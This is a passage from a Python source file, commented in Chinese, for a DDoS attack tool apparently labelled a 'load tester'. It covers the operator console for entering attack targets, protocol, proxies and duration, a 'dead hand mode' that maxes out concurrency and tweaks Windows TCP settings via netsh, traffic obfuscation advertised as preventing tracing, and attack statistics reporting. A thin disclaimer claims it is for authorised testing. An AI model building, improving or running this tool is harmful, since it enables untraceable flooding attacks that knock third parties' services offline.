                        os.system('netsh int tcp set global rss=enabled')
                        
                        # 死手模式特殊优化
                        if self.deadhand_mode:
                            # 最大化TCP连接参数
                            os.system('netsh int tcp set global maxsynretransmissions=2')
                            os.system('netsh int tcp set global initialRto=1000')
                            os.system('netsh int tcp set global ecncapability=disabled')
                            # 添加更多性能优化
                            os.system('netsh int tcp set global fastopen=enabled')
                            os.system('netsh int tcp set global timestamps=disabled')
                            os.system('netsh int tcp set global nonsackrttresiliency=disabled')
                            # 设置最低延迟
                            if is_admin():
                                try:
                                    # 设置网络优先级
                                    os.system('wmic process where name="python.exe" CALL setpriority "high priority"')
                                except:
                                    pass
                        
                        print(Fore.GREEN + "Windows网络参数已优化")
                    except Exception as e:
                        print(Fore.YELLOW + f"网络参数优化警告: {str(e)}")
                else:
                    print(Fore.YELLOW + "需要管理员权限以进行完全优化")
            
            # 动态调整并发度
            cpu_count = multiprocessing.cpu_count()
            ram_gb = psutil.virtual_memory().total / (1024**3)
            
            # 根据系统资源动态调整最大并发数
            if self.deadhand_mode:
                # 死手模式下设置极高的并发数
                self.max_concurrency = int(min(cpu_count * 100, ram_gb * 50))
                print(Fore.RED + f"死手模式已启用: 最大并发数设置为 {self.max_concurrency}")
            else:
                suggested_concurrency = int(min(cpu_count * 25, ram_gb * 10))
                if suggested_concurrency > self.concurrency:
                    self.max_concurrency = suggested_concurrency
                    print(Fore.GREEN + f"系统资源检测: CPU核心数={cpu_count}, RAM={ram_gb:.1f}GB")
                    print(Fore.GREEN + f"最大并发数已优化为: {self.max_concurrency}")
            
        except Exception as e:
            print(Fore.YELLOW + f"系统优化过程中出现警告: {str(e)}")

    def display_attack_statistics(self):
        """显示详细的攻击统计信息"""
        if not self.end_time:
            self.end_time = time.time()

        duration = self.end_time - self.start_time
        total_requests = self.successful_requests + self.failed_requests

        stats_header = "[攻击统计报告]:"
        logger.info(stats_header)
        print("\n" + "=" * 60)
        print(Fore.CYAN + stats_header)
        print("=" * 60)
        
        stats = []
        stats.append(f"[攻击持续时间]: {duration:.2f} 秒")
        if self.duration is not None:
            stats.append(f"[预设攻击时间]: {self.duration} 秒")
        stats.append(f"[总请求数]: {total_requests}")
        stats.append(f"[成功请求]: {self.successful_requests}")
        stats.append(f"[失败请求]: {self.failed_requests}")

        if total_requests > 0:
            success_rate = (self.successful_requests / total_requests) * 100
            stats.append(f"[成功率]: {success_rate:.2f}%")

        stats.append(f"[总流量消耗]: {self.total_data_sent / (1024 * 1024):.2f} MB")

        if duration > 0:
            req_per_sec = total_requests / duration
            mb_per_sec = (self.total_data_sent / (1024 * 1024)) / duration
            stats.append(f"[平均速率]: {req_per_sec:.2f} 请求/秒")
            stats.append(f"[平均带宽]: {mb_per_sec:.2f} MB/秒")
            
            # 添加峰值数据
            if hasattr(self, 'network_stats') and self.network_stats['peak_speed'] > 0:
                peak_mb_per_sec = self.network_stats['peak_speed'] / (1024 * 1024)
                stats.append(f"[峰值带宽]: {peak_mb_per_sec:.2f} MB/秒")

        stats.append(f"[攻击目标]: {len(self.targets)} 个目标")
        
        # 记录所有统计信息
        for stat in stats:
            logger.info(stat)
            print(Fore.GREEN + stat)
            
        # 记录目标信息
        for i, target in enumerate(self.targets):
            target_info = f"  目标 {i + 1}: {target}"
            logger.info(target_info)
            print(Fore.YELLOW + target_info)
        
        # 添加系统资源使用情况
        system_header = "[系统资源]:"
        logger.info(system_header)
        print(Fore.CYAN + system_header)
        
        cpu_usage = f"  CPU利用率: {psutil.cpu_percent()}%"
        memory_usage = f"  内存使用: {psutil.virtual_memory().percent}%"
        
        logger.info(cpu_usage)
        logger.info(memory_usage)
        
        print(Fore.GREEN + cpu_usage)
        print(Fore.GREEN + memory_usage)
        print("=" * 60)
        
        # 记录日志文件位置
        log_info = f"详细日志已保存至: {log_file}"
        print(Fore.CYAN + log_info)


class OperationConsole:
    CONFIG_FILE = "DDoSData.config"

    @staticmethod
    def show_deadhand_warning():
        """显示死手模式警告对话框"""
        try:
            # 创建一个隐藏的根窗口
            root = tk.Tk()
            root.withdraw()
            
            # 显示警告消息
            warning_message = """⚠️ 危险操作警告 ⚠️

死手模式将尽可能使用您计算机的所有资源来攻击目标。

这可能导致:
1. 您的计算机过热或变得无响应
2. 网络连接饱和，可能影响您的互联网服务提供商
3. 可能触发防火墙或安全系统的警报
4. 在某些地区可能违反法律

此模式仅供教育和授权渗透测试使用。

您确定要继续吗？"""
            
            result = messagebox.askokcancel("⚠️ 死手模式警告", warning_message, icon='warning')
            
            # 销毁根窗口
            root.destroy()
            
            return result
        except Exception as e:
            print(Fore.RED + f"无法显示图形界面警告: {str(e)}")
            # 如果无法显示图形界面，则回退到控制台警告
            print(Fore.RED + "\n" + "!" * 60)
            print(Fore.RED + "⚠️ 危险操作警告 - 死手模式 ⚠️")
            print(Fore.RED + "!" * 60)
            print(Fore.RED + "死手模式将尽可能使用您计算机的所有资源来攻击目标。")
            print(Fore.RED + "这可能导致您的计算机过热或变得无响应。")
            print(Fore.RED + "在某些地区可能违反法律。仅供教育和授权渗透测试使用。")
            response = input(Fore.RED + "您确定要继续吗？(yes/no): ").strip().lower()
            return response == 'yes'

    @staticmethod
    def config():
        if os.path.exists(OperationConsole.CONFIG_FILE):
            use_last = input(Fore.GREEN + "使用上次配置？(y/N): ").strip().lower()
            if use_last == 'y':
                with open(OperationConsole.CONFIG_FILE, 'r') as f:
                    saved = json.load(f)
                    return saved['targets'], saved['config']

        print(Fore.CYAN + "=== 高并发负载测试系统 ===Made by Brody R.")
        targets = OperationConsole._input_targets()
        protocol = input(Fore.GREEN + "协议 (http/tcp/udp): ").strip().lower()
        
        # 代理设置
        proxies = None
        use_proxy = input(Fore.GREEN + "使用代理？(y/N): ").strip().lower() == 'y'
        if use_proxy:
            proxy_count = int(input(Fore.GREEN + "代理数量: ") or 1)
            proxies = []
            print(Fore.YELLOW + "请输入代理地址 (格式: socks5://user:pass@host:port 或 http://host:port):")
            for i in range(proxy_count):
                proxy = input(f"{Fore.GREEN}代理 {i+1}: ").strip()
                if proxy:
                    proxies.append(proxy)
        
        # 攻击持续时间设置    
        duration_input = input(Fore.GREEN + "攻击持续时间（秒，留空表示无限制）: ").strip()
        duration = int(duration_input) if duration_input and duration_input.isdigit() else None
        
        if duration is not None and duration <= 0:
            print(Fore.YELLOW + "攻击持续时间必须大于0，设置为无限制")
            duration = None
        
        # 流量混淆设置
        obfuscation = input(Fore.GREEN + "启用高级流量混淆? (y/N): ").strip().lower() == 'y'
        
        # 死手模式设置
        deadhand_mode = False
        if input(Fore.RED + "启用死手模式？(y/N): ").strip().lower() == 'y':
            # 显示警告对话框
            if OperationConsole.show_deadhand_warning():
                deadhand_mode = True
                print(Fore.RED + "死手模式已激活！系统将使用全部资源进行攻击！")
            else:
                print(Fore.GREEN + "已取消死手模式")
        
        # 基本配置的修改，增加高级选项    
        config = {
            'request_size': int(input(Fore.GREEN + "请求大小 (默认 1024): ") or 1024),
            'concurrency': int(input(Fore.GREEN + "并发数 (默认 100): ") or 100),
            'timeout': int(input(Fore.GREEN + "超时 (秒，默认 30): ") or 30),
            'protocol': protocol,
            'proxies': proxies,
            'duration': duration,
            'obfuscation': obfuscation,
            'enable_random_delay': obfuscation,
            'enable_path_randomization': obfuscation,
            'enable_param_randomization': obfuscation,
            'dynamic_concurrency': True,  # 默认启用动态并发调整
            'deadhand_mode': deadhand_mode  # 死手模式设置
        }
        
        # 询问高级性能设置 (非死手模式下才询问)
        if not deadhand_mode and input(Fore.GREEN + "配置高级性能设置? (y/N): ").strip().lower() == 'y':
            print(Fore.CYAN + "\n高级性能设置:")
            config['dynamic_concurrency'] = input(Fore.GREEN + "  启用动态并发调整? (Y/n): ").strip().lower() != 'n'
            max_concurrency = input(Fore.GREEN + f"  最大并发数 (默认 {config['concurrency']*2}): ").strip()
            if max_concurrency and max_concurrency.isdigit():
                config['max_concurrency'] = int(max_concurrency)
            else:
                config['max_concurrency'] = config['concurrency'] * 2
        
        with open(OperationConsole.CONFIG_FILE, 'w') as f:
            json.dump({'targets': targets, 'config': config}, f)
        return targets, config

    @staticmethod
    def _input_targets():
        targets = []
        while True:
            target = input(Fore.YELLOW + f"目标 {len(targets) + 1}: ").strip()
            if not target:
                if targets: break
                continue
            if '://' not in target: target = f'http://{target}'
            targets.append(target)
        return targets


if __name__ == "__main__":
    logger.info("程序启动")
    print(Fore.CYAN + """
██████╗░██████╗░░█████╗░░██████╗  ████████╗███████╗░██████╗████████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝  ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
██║░░██║██║░░██║██║░░██║╚█████╗░  ░░░██║░░░█████╗░░╚█████╗░░░░██║░░░
██║░░██║██║░░██║██║░░██║╚█████╗░  ░░░██║░░░█████╗░░╚█████╗░░░░██║░░░
██████╔╝██████╔╝╚█████╔╝██████╔╝  ░░░██║░░░███████╗██████╔╝░░░██║░░░
╚═════╝░╚═════╝░░╚════╝░╚═════╝░  ░░░╚═╝░░░╚══════╝╚═════╝░░░░╚═╝░░░
""")
    
    # 显示管理员状态
    if platform.system() == 'Windows':
        if is_admin():
            admin_msg = "✅ 已以管理员权限运行，性能已优化"
            logger.info(admin_msg)
            print(Fore.GREEN + admin_msg)
        else:
            admin_msg = "⚠️ 未以管理员权限运行，部分优化功能受限"
            logger.warning(admin_msg)
            print(Fore.YELLOW + admin_msg)
    
    print(Fore.YELLOW + "使用 Ctrl+C 可随时停止攻击并查看统计信息\n")

    try:
        targets, config = OperationConsole.config()
        logger.info(f"配置加载完成: 目标数={len(targets)}, 协议={config['protocol']}")
        
        tester = LoadTester(
            targets=targets,
            request_size=config['request_size'],
            concurrency=config['concurrency'],
            timeout=config['timeout'],
            protocol=config['protocol'],
            proxies=config['proxies'],
            duration=config['duration'],
            deadhand_mode=config.get('deadhand_mode', False)  # 死手模式设置
        )
        
        # 应用高级混淆设置
        if 'obfuscation' in config and config['obfuscation']:
            obfuscation_msg = "已启用高级流量混淆，将帮助防止追踪"
            logger.info(obfuscation_msg)
            print(Fore.GREEN + obfuscation_msg)
            tester.enable_random_delay = config.get('enable_random_delay', True)
            tester.enable_path_randomization = config.get('enable_path_randomization', True)
            tester.enable_param_randomization = config.get('enable_param_randomization', True)
        
        # 应用高级性能设置
        if 'dynamic_concurrency' in config:
            tester.dynamic_concurrency = config['dynamic_concurrency']
        if 'max_concurrency' in config and not config.get('deadhand_mode', False):
            tester.max_concurrency = config['max_concurrency']
        
        # 如果启用了死手模式，显示警告信息
        if config.get('deadhand_mode', False):
            deadhand_msg = "⚠️ 死手模式已激活 - 系统将使用全部资源 ⚠️"
            logger.warning(deadhand_msg)
            print(Fore.RED + "\n" + "!" * 60)
            print(Fore.RED + deadhand_msg)
            print(Fore.RED + "!" * 60)
        
        # 如果设置了持续时间，创建一个主线程计时器
        if config['duration'] is not None:
            def stop_after_duration():
                time.sleep(config['duration'])
                logger.info(f"达到预设时间 {config['duration']} 秒，停止攻击")
                tester.stop_attack()
                
            timer = threading.Thread(target=stop_after_duration)
            timer.daemon = True
            timer.start()
            tester.threads.append(timer)
            
        # 强制启用键盘中断处理
        if platform.system() == 'Windows':
            # Windows系统上的特殊处理
            def force_enable_interrupts():
                while not tester.should_stop.is_set():
                    try:
                        time.sleep(0.1)
                    except KeyboardInterrupt:
                        logger.info("检测到键盘中断")
                        tester.stop_attack()
                        break
                        
            interrupt_handler = threading.Thread(target=force_enable_interrupts)
            interrupt_handler.daemon = True
            interrupt_handler.start()
            tester.threads.append(interrupt_handler)
            
        # 在主线程中运行攻击
        tester.start()
    except Exception as e:
        error_msg = f"程序发生错误: {str(e)}"
        logger.error(error_msg, exc_info=True)
        print(Fore.RED + error_msg)
        # 打印完整的错误堆栈
        import traceback
        traceback.print_exc()
    finally:
        # 最终清理
        try:
            # 强制垃圾回收
            gc.collect()
            logger.info("程序结束，执行最终清理")
        except:
            pass
            
        # 添加按任意键退出的功能
        print(Fore.YELLOW + "\n按任意键关闭窗口...", end="", flush=True)
        input()  # 等待用户按任意键